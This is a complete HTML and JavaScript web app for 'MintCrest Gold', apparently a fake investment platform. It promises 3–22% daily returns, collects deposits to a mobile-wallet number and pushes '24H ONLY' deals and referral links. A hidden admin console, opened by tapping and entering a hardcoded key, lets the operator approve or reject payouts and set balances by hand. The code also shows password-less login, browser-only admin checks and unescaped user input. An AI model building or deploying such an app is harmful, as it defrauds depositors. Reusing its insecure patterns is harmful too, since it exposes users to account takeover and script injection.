<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Professional Asset Custody</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.4s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .badge-pending { @apply bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        .badge-approved { @apply bg-green-500/10 text-green-400 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        .badge-rejected { @apply bg-red-500/10 text-red-500 px-2 py-1 rounded text-[7px] font-bold uppercase; }
        .promo-card { background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(147, 51, 234, 0.1)); border: 1px solid rgba(59, 130, 246, 0.3) !important; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-2 cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold">Verified Custodial Services</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600">
                <input type="text" id="user-name" placeholder="Legal Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Total Valuation</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-500 uppercase italic">Updating Blockchain...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic border border-white/5">No Active Tier</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📥 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📤 <span class="text-[9px] font-black block mt-2 uppercase tracking-widest">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Trading Fleet</h2>
            <p class="text-center text-[8px] font-bold opacity-40 uppercase mb-8 tracking-widest">Select your custodial tier</p>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center">
                <p class="text-[8px] font-bold text-gray-500 mb-4 uppercase">Referral Link</p>
                <input type="text" id="ref-link" readonly class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-bold mb-4 border border-white/5">
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-3 rounded-2xl font-black text-[9px] uppercase">Copy Link</button>
            </div>
            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-xs uppercase mb-6 italic text-center">Contact Support</h3>
                <textarea id="support-msg" placeholder="Describe your issue..." class="w-full bg-white/5 p-5 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 h-24"></textarea>
                <button onclick="sendSupport()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-[10px] uppercase">Submit Ticket</button>
            </div>
            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase">Logout</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm">Deposit Capital</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black">
                    <div class="glass p-5 rounded-2xl flex justify-between"><span>JAZZCASH</span><span>03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between"><span>EASYPAISA</span><span>03705519562</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center font-bold uppercase outline-none">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm">Request Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase">Request Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Admin Console</h2>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        <div class="flex gap-2 mb-8 overflow-x-auto pb-2">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Orders</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">User List</button>
            <button onclick="showAdmTab('support')" class="glass px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Tickets</button>
        </div>
        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3"></div>
        <div id="adm-sec-support" class="adm-tab hidden space-y-3"></div>
        <div class="glass p-8 rounded-[3rem] mt-10">
            <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-bold border border-white/5">
            <input type="number" id="adm-val" placeholder="Amount (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold border border-white/5">
            <div class="grid grid-cols-2 gap-2"><button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Bal</button><button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Prof</button></div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase mt-1">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🛡️<span class="text-[8px] font-black uppercase mt-1">Support</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // 20 TOTAL PLANS (15 Regular + 5 Special)
        const plans = [
            { n: "Micro-I", p: 200, r: 3 }, { n: "Micro-II", p: 500, r: 3.2 },
            { n: "Starter-I", p: 1000, r: 3.5 }, { n: "Starter-II", p: 2000, r: 3.8 },
            { n: "Bronze-I", p: 3000, r: 4.2 }, { n: "Bronze-V", p: 5000, r: 4.5 },
            { n: "Silver-I", p: 7000, r: 5 }, { n: "Silver-V", p: 10000, r: 5.5 },
            { n: "Gold-I", p: 15000, r: 6 }, { n: "Gold-V", p: 20000, r: 6.5 },
            { n: "Platinum-I", p: 30000, r: 7 }, { n: "Platinum-V", p: 40000, r: 7.5 },
            { n: "Diamond-I", p: 50000, r: 8 }, { n: "Diamond-V", p: 75000, r: 9 },
            { n: "Royal Master", p: 100000, r: 10 },
            // SPECIAL 24H OFFERS
            { n: "⭐ FLASH-SPECIAL", p: 500, r: 12, s: true },
            { n: "⭐ VIP-PROMO", p: 2500, r: 14, s: true },
            { n: "⭐ ELITE-DEAL", p: 8000, r: 15, s: true },
            { n: "⭐ ROCKET-OFFER", p: 12000, r: 18, s: true },
            { n: "⭐ CROWN-BONUS", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { const saved = localStorage.getItem('mintcrest_user'); if(saved) { document.getElementById('user-name').value = saved; login(); } setInterval(updateCountdown, 1000); };
        function logout() { if(confirm("Logout?")) { localStorage.removeItem('mintcrest_user'); location.reload(); } }
        function adminTap() { tapCount++; if(tapCount >= 3) { tapCount = 0; if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } } setTimeout(()=>tapCount=0,2000); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mintcrest_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierExpiry: 0 });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = window.location.origin + window.location.pathname + "?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName || "Inactive"; if(user.tierExpiry > 0 && Date.now() > user.tierExpiry) resetTier(name); checkProfitRequirement(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[9px] font-black uppercase">No Data</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { const border = d.type.includes('deposit') ? 'border-blue-500' : (d.type.includes('Profit') ? 'border-green-500' : 'border-red-500'); list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${border} mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleDateString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'promo-card' : '';
                const tag = p.s ? '<span class="text-[7px] bg-blue-600 px-2 py-0.5 rounded-full ml-2">24H ONLY</span>' : '';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass ${style} p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 transition-all cursor-pointer"><div><h4 class="font-black text-[10px] uppercase ${p.s ? 'text-blue-400' : 'text-gray-400'}">${p.n} ${tag}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily / 30 Days</p></div><p class="font-black text-[12px]">₨ ${p.p.toLocaleString()}</p></div>`;
            });
        }

        async function buy(p, roi, tierName) {
            if(user.balance < p) { alert("Low Balance."); changePage('wallet'); }
            else { const expiry = Date.now() + (30 * 86400000); await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tierName, tierExpiry: expiry, lastReqTime: Date.now() }); await db.collection("requests").add({ user: user.name, amount: p, type: "Tier Activation", status: "approved", time: Date.now() }); alert(tierName + " Activated!"); changePage('activity'); }
        }

        async function checkProfitRequirement(userData) { if (userData.activeTier > 0 && (Date.now() - userData.lastReqTime) >= 86400000) { const dp = (userData.activeTier * userData.tierROI) / 100; await db.collection("requests").add({ user: userData.name, amount: dp, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(userData.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const diff = (user.lastReqTime + 86400000) - Date.now(); if (diff > 0) { const h = Math.floor(diff/3600000); const m = Math.floor((diff%3600000)/60000); const s = Math.floor((diff%60000)/1000); document.getElementById('countdown-display').innerText = `YIELD IN: ${h}h ${m}m ${s}s`; } else { document.getElementById('countdown-display').innerText = "YIELD REQ SENT"; } } else { document.getElementById('countdown-display').innerText = "VAULT OFFLINE"; } }
        async function sendSupport() { const msg = document.getElementById('support-msg').value; if(!msg) return; await db.collection("requests").add({ user: user.name, amount: 0, type: "Support Ticket", status: "pending", message: msg, time: Date.now() }); document.getElementById('support-msg').value = ''; alert("Ticket Submitted!"); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        async function submitDeposit() { const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; if(!a||!t) return; await db.collection("requests").add({user:user.name, amount:parseInt(a), tid:t, type:"deposit", status:"pending", time:Date.now()}); alert("Deposited!"); changePage('activity'); }
        async function submitWithdraw() { const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a||!acc||a>user.balance) return; await db.collection("requests").add({user:user.name, amount:parseInt(a), acc:acc, type:"withdraw", status:"pending", time:Date.now()}); await db.collection("users").doc(user.name).update({balance:user.balance-parseInt(a)}); alert("Requested!"); changePage('activity'); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Link Copied!"); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const rL = document.getElementById('adm-sec-requests'); const sL = document.getElementById('adm-sec-support'); rL.innerHTML = ''; sL.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); const ui = `<div class="glass p-5 rounded-2xl flex justify-between items-center mb-2 text-[9px] font-black uppercase"><div>${d.user}<br>${d.type==='Support Ticket' ? d.message : d.amount+' ('+d.type+')'}</div><div class="flex gap-2"><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'approved', '${d.type}')" class="bg-green-600 px-4 py-2 rounded-xl">YES</button><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'rejected', '${d.type}')" class="bg-red-600 px-4 py-2 rounded-xl">NO</button></div></div>`; if(d.type==='Support Ticket') sL.innerHTML += ui; else rL.innerHTML += ui; });
            });
            db.collection("users").onSnapshot(snap => { const list = document.getElementById('adm-sec-users'); list.innerHTML = ''; snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-2xl flex justify-between items-center mb-2 text-[9px] font-black uppercase"><div>${u.name}</div><div>Bal: ${u.balance}<br>Inv: ${u.activeTier || 0}</div><button onclick="deleteUser('${u.name}')" class="text-red-500">×</button></div>`; }); });
        }
        async function handleReq(id, target, amt, action, type) { const ref = db.collection("users").doc(target); const d = await ref.get(); if(action === 'approved') { if(type==='deposit' || type.includes('Profit') || type.includes('Referral')) await ref.update({ balance: (d.data().balance || 0) + amt }); } else if(action === 'rejected' && type === 'withdraw') { await ref.update({ balance: (d.data().balance || 0) + amt }); } await db.collection("requests").doc(id).update({ status: action }); }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = document.getElementById('adm-val').value; const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) }); alert("Done!"); }
        async function deleteUser(n) { if(confirm("Delete "+n+"?")) await db.collection("users").doc(n).delete(); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
